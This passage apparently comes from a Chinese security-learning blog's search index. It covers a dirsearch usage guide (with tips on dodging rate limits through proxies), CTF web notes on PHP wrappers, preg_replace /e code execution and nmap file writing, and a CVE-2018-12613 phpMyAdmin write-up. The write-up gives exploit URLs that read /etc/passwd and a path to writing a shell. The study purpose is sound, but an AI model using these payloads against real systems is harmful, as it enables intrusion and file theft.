-e php,html,js -u https://target --proxylist proxyservers.txt\n\n报告支持的报表格式:Simple、Plain、JSON、XML、MD、CSV、HTML\npython3 dirsearch.py -e php -l URLs.txt --format plain -o report.txtpython3 dirsearch.py -e php -u https://target --format html -o target.json\n\n其他命令​        有更多的功能，你需要自己去发现\npython3 dirsearch.py -u https://target -t 100 -m POST --data &quot;username=admin&quot;python3 dirsearch.py -u https://target --random-agent --cookie &quot;isAdmin=1&quot; -Fpython3 dirsearch.py -u https://target --format json -o target.jsonpython3 dirsearch.py -u https://target --auth admin:pass --auth-type basicpython3 dirsearch.py -u https://target --header-list rate-limit-bypasses.txtpython3 dirsearch.py -u https://target -q --stop-on-error --max-time 360python3 dirsearch.py -u https://target --full-url --max-rate 100python3 dirsearch.py -u https://target --remove-extensions\n\n小贴士-服务器有请求限制？这很糟糕，但是可以通过使用’–proxy-list’随机化proxy来绕过它-想找出配置文件或备份吗？尝试--suffixes ~和--prefixes .-只想查找文件夹&#x2F;目录？为什么不结合’–remove-extensions’和’–suffixes&#x2F;！ ######\nThe mix of –cidr, -F, -q and will reduce most of noises + false negatives when brute-forcing with a CIDR扫描一个网址列表，但不想看到一个429 flood？–Skip-on-Status 429&#96;将帮助您在返回429时跳过目标-服务器包含会减慢扫描速度的大文件？您可能希望使用headHTTP方法而不是get-Brute-forcing CIDR慢？可能您忘了减少请求超时和请求重试。建议:&#96;–timeout 3 –retries 1 ######\n强制性-u URL, --url=URL   目标URL   -l FILE, --url-list=FILE                       目标URL列表文件   --stdin             来自STDIN的目标URL列表   --cidr=CIDR         CIDR目标   --raw=FILE          文件从文件加载原始HTTP请求（使用`--Scheme`标志设置方案）   -e EXTENSIONS, --extensions=EXTENSIONS                       用逗号分隔的扩展列表（例如:php、asp)   -X EXTENSIONS, --exclude-extensions=EXTENSIONS                       排除用逗号分隔的扩展名列表（例如：asp、jsp）   -f, --force-extensions                       为每个wordlist条目添加扩展名。默认情况下dirsearch仅将%ext%关键字替换为扩展\n\n\n\n字典设置   -w WORDLIST, --wordlists=WORDLIST                       自定义Wordlist（用逗号分隔）   --prefixes=PREFIXES                       为所有wordlist条目添加自定义前缀（分开按逗号）   --suffixes=SUFFIXES                       将自定义后缀添加到所有wordlist条目，忽略目录（用逗号分隔）   --only-selected     移除路径的扩展名与选定的不同通过`-e`的（保留条目没有扩展名）   --remove-extensions                       删除所有路径中的扩展（例如： admin.php -&gt; admin)   -U, --uppercase     Uppercase wordlist   -L, --lowercase     Lowercase wordlist   -C, --capital       Capital wordlist\n\n\n\n一般设置-t THREADS, --threads=THREADS                       线程数   -r, --recursive     蛮力递归   --deep-recursive    对每个目录深度执行递归扫描（例如： api/users -&gt; api/)   --force-recursive   每个找到的路径做递归蛮力，而不是只有路径以斜杠结尾   --recursion-depth=DEPTH                       最大递归深度   --recursion-status=CODES                       执行递归扫描的有效状态代码，支持范围（用逗号分隔）   --subdirs=SUBDIRS   扫描给定URL[s]的子目录（由逗号）   --exclude-subdirs=SUBDIRS                       在递归过程中排除以下子目录扫描（用逗号分隔）   -i CODES, --include-status=CODES                       包括状态代码，以逗号分隔，支持范围（例如：200,300-399）   -x CODES, --exclude-status=CODES                       排除状态代码，用逗号分隔，支持范围（例如：301,500-599）   --exclude-sizes=SIZES                      按大小排除响应，用逗号分隔（例如:123B,4KB)   --exclude-texts=TEXTS                      按文本排除答复，用逗号分隔（例如:&#x27;not found&#x27;、&#x27;error&#x27;)   --exclude-regexps=REGEXPS                       用逗号分隔的正则表达式排除响应（例如：“not foun[a-z]&#123;1&#125;”,“^error$”）   --exclude-redirects=REGEXPS                       通过重定向正则表达式或文本排除响应，用逗号分隔（例如:&#x27;https://okta.com/*&#x27;)   --exclude-content=PATH                       按此路径的响应内容排除响应   --skip-on-status=CODES                       只要击中其中一个状态代码，就跳过目标，用逗号分隔，支持ranges   --minimal=LENGTH    最小响应长度   --maximal=LENGTH    最大响应长度   --max-time=SECONDS  扫描的最大运行时间   -q, --quiet-mode    安静模式   --full-url          输出中的完整URL（在安静模式）   --no-color          无彩色无彩色输出\n\n请求设置   \t-m METHOD, --http-method=METHOD                        HTTP方法（默认值：GET）    -d DATA, --data=DATA                        HTTP请求数据    -H HEADERS, --header=HEADERS                        HTTP请求头，支持多个标志（例如：-H &#x27;Referer: example.com&#x27;）    --header-list=FILE  文件包含HTTP请求头    -F, --follow-redirects                        遵循HTTP重定向    --random-agent      为每个请求选择一个随机用户代理    --auth-type=TYPE    身份验证类型 (basic, digest, bearer, ntlm)    --auth=CREDENTIAL   身份验证凭证 (user:password or bearer token)    --user-agent=USERAGENT    --cookie=COOKIE连接设置    --timeout=TIMEOUT   超时连接超时    -s DELAY, --delay=DELAY                        请求之间的延迟    --proxy=PROXY       代理URL，支持HTTP和SOCKS代理（例如：localhost:8080，socks5://localhost:8088)    --proxy-list=FILE   文件包含代理服务器    --replay-proxy=PROXY                        使用找到的路径重播的代理    --scheme=SCHEME     默认方案（对于原始请求或如果没有URL中的方案）    --max-rate=RATE     每秒最大请求数    --retries=RETRIES   重试失败请求的重试次数    -b, --request-by-hostname                        默认情况下，dirsearch按IP请求速度。这个将强制dirsearch按主机名请求    --ip=IP             每当发生错误就退出  报告：    -o FILE, --output=FILE                        输出文件    --format=FORMAT     format报表格式（可用:simple、plain、json、xml，md,csv,html）\n\n配置可以在配置文件中编辑dirsearch标志的默认值:Default.conf\n# 如果要编辑dirsearch默认配置，可以编辑此文件中的值。&#x27;#&#x27;后面的一切都是注释并且不会被应用[mandatory]default-extensions = php,aspx,jsp,html,jsforce-extensions = False# exclude-extensions = old,log[general]threads = 30recursive = Falsedeep-recursive = Falseforce-recursive = Falserecursion-depth = 0exclude-subdirs = %%ff/random-user-agents = Falsemax-time = 0full-url = Falsequiet-mode = Falsecolor = Truerecursion-status = 200-399,401,403# include-status = 200-299,401# exclude-status = 400,500-999# exclude-sizes = 0b,123gb# exclude-texts = &quot;Not found&quot;# exclude-regexps = &quot;403 [a-z]&#123;1,25&#125;&quot;# exclude-content = 404.html# skip-on-status = 429,999[reports]report-format = plainautosave-report = True# report-output-folder = /home/user# logs-location = /tmp## Supported: plain, simple, json, xml, md, csv, html[dictionary]lowercase = Falseuppercase = Falsecapitalization = False# prefixes = .,admin# suffixes = ~,.bak# wordlist = db/dicc.txt[request]httpmethod = get## Lowercase onlyfollow-redirects = False# headers-file = headers.txt# user-agent = MyUserAgent# cookie = SESSIONID=123[connection]timeout = 5delay = 0scheme = httpmaxrate = 0retries = 2request-by-hostname = Falseexit-on-error = False# proxy = localhost:8080# proxy-list = proxies.txt# replay-proxy = localhost:8000\n\n","tags":["search","Web工具","信息收集"]},{"title":"Hello World","url":"/2022/11/21/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"web刷题(一)","url":"/2022/11/22/web%E5%88%B7%E9%A2%98-%E4%B8%80/","content":"ssrf（服务端请求伪造）​\t原因：web网站会从其他的服务器获取信息然后显示到当前网站上，而这个获取信息的url链接是用户自己可控的，且过滤要求不是很严\n​\t危害：可用来获取web服务器本地的一些敏感文件，如使用php伪协议的file:&#x2F;&#x2F;\nIP 伪造​\tX-Foewared-For：用来获取客户端的ip地址—-可自定义伪造\n模块注入​\tjava的spring， python的flask，php的tp \n​\t用户提交的信息被当作代码执行：\n​\t\t其中变量为 {  {  } } 的形式 \nshell命令​\t单引号中的变量( $shell ) 不会 被当作变量执行\n​\t双引号中的变量( $shell ) 会被当做变量执行\n┌──(kali㉿kali)-[~]└─$ echo &quot;\\&lt;&quot;                                                            \\&lt;                                                                                                                                                                                                 ┌──(kali㉿kali)-[~]└─$ echo &#x27;\\&lt;&#x27;\\&lt;                                                                                                                                                                                                 ┌──(kali㉿kali)-[~]└─$ echo \\&lt;  &lt;\t\t\t\t#没有引号的时候，会转义，\n\n\npython的虚拟环境:\n# 创建python -m venv 环境名# 激活source 环境名/bin/sctivate#退出deactivate\n\n\n\n正则表达式​\t循环匹配的—- ( ?R )\n\n​\t ( ?R )\t ：匹配一次   \n ( ?R )+   ：匹配一次或多次  \n\n​\t ( ?R )*    ：匹配0次或多次 \n​\t ( ?R )？   ：匹配0次或1词   \n​\t  \n​\t因为是递归循环匹配的（相当于一直在循环匹配），前两个如果匹配到的话是没有退出条件的（所以匹配不成功），而后两个是由退出条件（即为0次，时），所以可以匹配成功\n​\t例子：\n​\t\ta(b(c()))—–若按第二个匹配来的话，那么最里的括号里应该还有能匹配的\n​\t\t\t\t\t\t\t按第三个来的话，匹配到 ***c()***时，此时没有能匹配的了，匹配次数为0.相当于在此停止匹配了\nphp\n读文件到页面的方法：\n\n​\tphp伪协议：file：//或php：//filte\n\nfile_get_contents()函数\n\n​    使用系统命令，如：system(&quot;ls&quot;)或system(&quot; cat /flag&quot;)\n\n​    使用highlight_file()或show_source()\n\nphp使用session（可用来伪造session信息，从而绕过安全检测！！）\n\n手动启用：session_start() #会自动生成一个session_id值\n自定义session的值：$_session[&#39;key&#39;]\n可使用抓包工具更改session_id的值，然后服务端使用函数读取session_id，以此来绕过一些字符串检测\n\n\n\n\nphp伪协议：\n\n​\t读文件\n\nphp://filter/read=convert.base64-encode/resource= &#39; xxx.php &#39;\n\nfile://&#39; 路径名 &#39;\n\n​    写文件(输入文件流)\n\nphp://filter/write=convert.base64-encode/resource=&#39;  xxx.php &#39; &amp;&amp; txt= &quot;内容&quot;\nphp://filter/resource=&#39;  xxx.php &#39; &amp;&amp; txt= &quot;内容&quot;\nphp://input  ----- 此时使用post传数据流\ndata://text/plain;base64,&quot; 编码内容 “\n\n\n\n\n​    执行命令\n\n\n\nphp的坑：\n\n​\t在后端传参时，有些特殊字符会被默认替换：\n\n\n\n​\t\t     如： .*  =&gt; _*    即传参数时，小数点开头则会被替换为_\n​\t\t 2.    使用变量输出时，单引号中变量不存在，双引号中变量存在\npreg_replace($pattern, $replacement, $subject)函数，其中$pattern的标志有\\e，PHP 5.5.0 起， 传入 “\\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\\e” 也无法起效。\npreg_replace（）函数的漏洞\n​\t匹配成功后，第二个参数会被当作代码执行\n​\t而preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\\\1&quot;)&#39;,$str）中的\\\\1会被解释为\\1 即为正则匹配到的第一个字符（group(1)）\n​\t漏洞执行过程：\npreg_replace(&#x27;/.*/ei&#x27;,&#x27;strtolower(&quot;\\\\1&quot;)&#x27;,phpinfo()）             相当于是 eval(&#x27;strtolower(&quot;phpinfo()&quot;)&#x27;),此时phpinfo()是一个字符串，不能执行该代码preg_replace(&#x27;/.*/ei&#x27;,&#x27;strtolower(&quot;\\\\1&quot;)&#x27;,$&#123;phpinfo()&#125;)             相当于是 eval(&#x27;strtolower(&quot;$&#123;phpinfo()&#125;&quot;)&#x27;) 此时phpinfo()是一个变量，可以执行改代码，             但是！！！当strtolower()内为单引号时，便不行了！！！！！\n\n\n\nphp的循环遍历：\nforeach($_GET as $key =&gt; $value)&#123;    print($key);    print($value);&#125;\n\n\n\nnmapnamp 的 oG 命令，可以写入文件\nnmap  -sT 192.168.1.0 -oG  123.php\t#把执行过程与结果，写入到文件123.php中nmao &#x27;&#x27;/&lt;/?&#x27;&#x27;\n\n\n\n\n\n","categories":["Web"],"tags":["ssrf","nmap","正则","preg_replace"]},{"title":"漏洞知识记录","url":"/2022/11/22/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/","content":"CVE-2018-12613&amp;PHPmyadmin 4.8.1漏洞漏洞范围：phpmyadmin 4.8.0以及4.8.1\n漏洞原理：在index.php的第60-63行代码\n##  phpadmin的index.php文件$target_blacklist = array (    &#x27;import.php&#x27;, &#x27;export.php&#x27;);// If we have a valid target, let&#x27;s load that script insteadif (! empty($_REQUEST[&#x27;target&#x27;])    &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])    &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])    &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])) &#123;    include $_REQUEST[&#x27;target&#x27;];    exit;&#125;\n\n当满足5个条件后就会include $_REQUEST[&#39;target&#39;];\n\n$_REQUEST[&#39;target&#39;]不为空\n$_REQUEST[&#39;target&#39;]是字符串\n$_REQUEST[&#39;target&#39;]不以index开头\n$_REQUEST[&#39;target&#39;]不在$target_blacklist中&#39;import.php&#39;, &#39;export.php&#39;\nCore::checkPageValidity($_REQUEST[&#39;target&#39;])为真代码在libraries\\classes\\Core.php 443-476行\n\n问题出现在第 465 行的urldecode() 我们可以利用这个函数绕过白名单检测，只要把?两次url编码为 %253f 即可绕过验证。\npublic static function checkPageValidity(&amp;$page, array $whitelist = [])&#123;    if (empty($whitelist)) &#123;        $whitelist = self::$goto_whitelist;    &#125;    if (! isset($page) || !is_string($page)) &#123;        return false;    &#125;    if (in_array($page, $whitelist)) &#123;        return true;    &#125;    $_page = mb_substr(        $page,        0,        mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)    );    if (in_array($_page, $whitelist)) &#123;        return true;    &#125;    $_page = urldecode($page);    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)    );    if (in_array($_page, $whitelist)) &#123;        return true;    &#125;    return false;&#125;## 基本做了三次白名单匹配## 第一次匹配传进来的$page参数## 第二次匹配截取的$_page## 第三次匹配先url解码在截取的$_page## 截取字符方式，mb_strpos函数获取?出现的位置（本意是想新添加?，再获取其在字符最后的位置即为字符长度），然后再用mb_substr函 ## 数获取从位置0开始，$page长的的字符串## 绕过方法## 1. 绕第二个匹配（直接加个?)；可以使用target=db_sql.php%37/../../../../../../etc/passwd## 2. 绕第三个匹配(加一个?的url编码）；也可以用target=db_sql.php%253f/../../../../../../etc/passwd\n\n漏洞利用（第二种绕过方式）：\n\n任意文件读取\n读取etc/passwd：http://IP/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../etc/passwd\n或者：http://IP/phpmyadmin/index.php?target=db_datadict.php%253f/../../../../../etc/passwd\n\n任意代码执行&amp;&amp;写入shell\n查看当前的运行目录：\n\n创建数据库，数据表，字段，写入值\n\n然后包含该文件：http://IP/phpmyadmin/index.php?target=db_sql.php%253f/../../../mysql/data/cve/cve.MYD，即可访问phpinfo\n\n\n","categories":["Web"],"tags":["PHPmyadmin","php"]}]